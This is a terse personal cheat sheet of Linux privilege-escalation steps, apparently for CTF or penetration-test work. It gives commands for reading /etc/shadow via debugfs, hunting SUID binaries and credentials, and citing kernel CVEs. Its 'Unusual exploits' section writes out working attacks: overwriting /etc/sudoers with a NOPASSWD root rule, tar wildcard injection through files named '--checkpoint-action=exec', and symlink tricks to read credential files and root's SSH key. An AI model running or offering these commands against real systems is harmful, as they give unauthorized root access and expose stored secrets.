
#### SOP for Linux 

0. Disk group: id => `debugfs -w /dev/sdaX` then `cat /etc/shadow` 
1. Check `sudo -l` , su , env ~ (eg env, apt-get) 
2. SUID `find / -perm -4000 -type f 2>/dev/null` = GTFObins (eg find, strace, gcore) 
3. Cron jobs in /etc/crontab ; PATH has /dev/shm ? Job is writable? 
4. Find creds in /var/www , databases like *.db 
5. Run `pspy64` to see creds in running processes (eg mysqldump) 
6. Exploits, eg Polkit CVE-2021-4034 , CVE-2026-31431, Dirty Frags 



#### Unusual exploits 
- Just whack the user into `/etc/sudoers` when unsure. 
- Privesc has "tar ... *" ; put `echo 'user ALL=(root) NOPASSWD: ALL' > /etc/sudoers` in payload.sh 
- - Then `echo "" > '--checkpoint=1'` and `echo "" > '--checkpoint-action=exec=sh payload.sh'` and tar. 
- User in mlocate group, run `strings mlocate.db` to find creds file 
- - Run `ln -sf /path/cred.txt test` then `sudo -u other_user /usr/bin/sync.sh test`. 
- If Docker try `ln -s /root/.ssh/id_rsa /var/log/gitlab/root_key` then `unzip /opt/backups/backup.zip` 
- If custom binary try `ls -al` and `--help` ; if * in custom path try ../../ too. 
